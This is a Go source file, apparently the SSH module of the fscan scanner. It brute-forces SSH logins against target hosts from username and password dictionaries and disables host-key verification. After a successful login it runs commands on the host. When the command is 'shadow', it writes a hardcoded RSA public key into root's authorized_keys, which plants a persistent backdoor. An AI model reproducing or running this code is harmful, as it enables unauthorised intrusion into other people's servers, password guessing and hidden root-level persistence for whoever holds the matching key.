package Plugins

import (
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/common"
	"golang.org/x/crypto/ssh"
	"io/ioutil"
	"net"
	"strings"
	"time"
)

func SshScan(info *common.HostInfo) (tmperr error) {
	starttime := time.Now().Unix()
	for _, user := range common.Userdict["ssh"] {
		for _, pass := range common.Passwords {
			pass = strings.Replace(pass, "{user}", user, -1)
			flag, err := SshConn(info, user, pass)
			if flag == true && err == nil {
				return err
			} else {
				errlog := fmt.Sprintf("[-] ssh %v:%v %v %v %v", info.Host, info.Ports, user, pass, err)
				common.LogError(errlog)
				tmperr = err
				if common.CheckErrs(err) {
					return err
				}
				if time.Now().Unix()-starttime > (int64(len(common.Userdict["ssh"])*len(common.Passwords)) * info.Timeout) {
					return err
				}
			}
			if info.SshKey != "" {
				return err
			}
		}
	}
	return tmperr
}

func SshConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	flag = false
	Host, Port, Username, Password := info.Host, info.Ports, user, pass
	Auth := []ssh.AuthMethod{}
	if info.SshKey != "" {
		pemBytes, err := ioutil.ReadFile("shadow")
		if err != nil {
			return false, errors.New("read key failed" + err.Error())
		}
		signer, err := ssh.ParsePrivateKey(pemBytes)
		if err != nil {
			return false, errors.New("parse key failed" + err.Error())
		}
		Auth = []ssh.AuthMethod{ssh.PublicKeys(signer)}
	} else {
		Auth = []ssh.AuthMethod{ssh.Password(Password)}
	}

	config := &ssh.ClientConfig{
		User:    Username,
		Auth:    Auth,
		Timeout: time.Duration(info.Timeout) * time.Second,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%v:%v", Host, Port), config)
	if err == nil {
		defer client.Close()
		session, err := client.NewSession()
		if err == nil {
			defer session.Close()
			flag = true
			var result string
			if info.Command != "" {
				if info.Command == "shadow" {
					info.Command = "mkdir dir /root/.ssh/ && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDkQQuWtmLm0eEhogGubMFh2/qv21aQV1tzbRjySPNQJRig479hMre48jxWDzB71WdEU2vg+ns8/0s3jqcGAx5lJaneH1ovLRNdIq4PkfmJPSMCEibGoNVS47rvfrv4QgECnbAt3azklnvniDvZiP5KjBQS9z57Ni2WVDC1SHNy1PDVMGYMJxZZ8kVKP7LRDbiOKJsSplHV/qP3NGZkdKh7OUYBx8A7+S3vT9c3AMSmk74Z2ibU0sddlngf0hLOxbTRiJV+OsgQQOfnttZvA7LoxbCiMtpzKGLOLAHXD8Hx5okXkx8cGOjc+Fcr6s2eQ10BLGPO4LPYWQ+G91xj+VF7 sysadmin\">> /root/.ssh/authorized_keys"
				}
				combo, _ := session.CombinedOutput(info.Command)
				result = fmt.Sprintf("[+] SSH:%v:%v:%v %v \n %v", Host, Port, Username, Password, string(combo))
				if info.SshKey != "" {
					result = fmt.Sprintf("[+] SSH:%v:%v sshkey correct \n %v", Host, Port, string(combo))
				}
				common.LogSuccess(result)
			} else {
				result = fmt.Sprintf("[+] SSH:%v:%v:%v %v", Host, Port, Username, Password)
				if info.SshKey != "" {
					result = fmt.Sprintf("[+] SSH:%v:%v sshkey correct", Host, Port)
				}
				common.LogSuccess(result)
			}
		}
	}
	return flag, err

}
